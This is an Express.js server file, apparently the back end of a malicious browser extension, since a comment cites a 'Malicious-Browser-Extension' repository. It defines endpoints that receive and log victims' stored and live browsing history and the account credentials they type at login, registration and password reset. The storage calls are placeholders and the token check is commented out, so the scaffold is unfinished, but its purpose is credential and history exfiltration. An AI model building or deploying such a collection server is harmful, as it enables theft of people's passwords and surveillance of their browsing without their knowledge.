import express from "express";
import bodyParser from "body-parser";
// import path from "path";

import { InputError, AccessError } from "./error";
import SaveData from "./util/SaveData";
const sd = new SaveData();

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const catchErrors = (fn) => async (req, res) => {
  try {
    await fn(req, res);
    // save();
  } catch (err) {
    console.log("CAUGHT ERROR", err.message);
    if (err instanceof InputError) {
      res.status(400).send({ error: err.message });
    } else if (err instanceof AccessError) {
      res.status(403).send({ error: err.message });
    } else {
      console.log(err);
      res.status(500).send({ error: "A system error ocurred" });
    }
  }
};

const authed = (fn) => async (req, res) => {
  // TODO maybe do token check
  // const pass = req.header("Authorization");
  // if (pass !== process.env.POSTGRES_EDIT_TOKEN) {
  //   throw new AccessError("Invalid Token");
  // }
  await fn(req, res);
};

// Serve our base route that returns a Hello World cow
app.get(
  "/test/",
  catchErrors(async (req, res) => {
    const moo = "mooooooo!";
    res.json({ moo });
  })
);

// /****************************************************************
//                        Logging Saved Data
// ****************************************************************/

// USER ID
// https://github.com/nigamaviral/Malicious-Browser-Extension/blob/master/extension/background.js#L228
// https://stackoverflow.com/a/23854032

// Save stored history data
app.post(
  "/history/stored/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, date, history } = req.body;
      // generate date stamp (here or from request?)

      const result = await sd.placeholder(uid, date, history);
      res.json({ result });
    })
  )
);

// Save stored account details
app.post(
  "/account/stored/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, date, accounts } = req.body;
      // generate date stamp (here or from request?)

      const result = await sd.placeholder(uid, date, accounts);
      res.json({ result });
    })
  )
);

// /****************************************************************
//                        Logging Live Data
// ****************************************************************/

// Log currently visiting webpages
app.post(
  "/history/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, date, url } = req.body;
      // generate date stamp (here or from request?)

      const result = await sd.placeholder(uid, date, url);
      res.json({ result });
    })
  )
);

// Log currently entered account details (login/register/reset password)
app.post(
  "/account/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, date, details } = req.body;
      // generate date stamp (here or from request?)

      const result = await sd.placeholder(uid, date, details);
      res.json({ result });
    })
  )
);

/********************** Running the server ************************/

// Choose the port and start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Starting server on port ${PORT}`);
});
